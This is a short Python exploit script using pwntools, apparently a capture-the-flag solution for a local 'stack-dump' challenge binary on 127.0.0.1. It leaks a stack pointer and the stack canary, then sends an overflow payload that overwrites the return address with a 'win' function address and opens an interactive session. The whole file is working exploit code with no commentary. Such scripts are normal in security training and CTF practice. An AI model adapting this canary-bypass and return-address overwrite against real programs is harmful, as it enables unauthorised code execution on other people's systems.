#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 6003

win_addr = 0x080486cd
offset = 96

c = remote(host, port)
#c = process("../stack-dump")

#c = gdb.debug("../stack-dump")

reply = c.recvlines(2)	# starting lines
stack_ptr = re.search('0x(.{8})', reply[1]).group(0)
print("Useful stack pointer: %s" % (stack_ptr))

c.recvlines(4)
c.sendline("a")

c.sendline("5")

stack_ptr = int(stack_ptr, 0)
stack_ptr += 105

payload_leak = p32(stack_ptr)
payload_leak += "\n"

c.sendline(payload_leak)

c.recvlines(10)

c.sendline("b")

canary = c.recvline()
canary = canary[22:26]
print("Canary: %s (%d bytes)" %(canary, len(canary)))

c.recvlines(4)

addr_offset = cyclic_find(0x61616164)

size = offset + 4 + addr_offset + 4 + 1
c.sendline("a")
c.sendline(str(size))

payload_return = "a"*offset
payload_return += canary
#payload_return += cyclic(size-offset-4-1)
payload_return += "a"*addr_offset
payload_return += p32(win_addr)
payload_return += "\n"

c.sendline(payload_return)
c.recvlines(10)
c.sendline("d")

c.interactive()
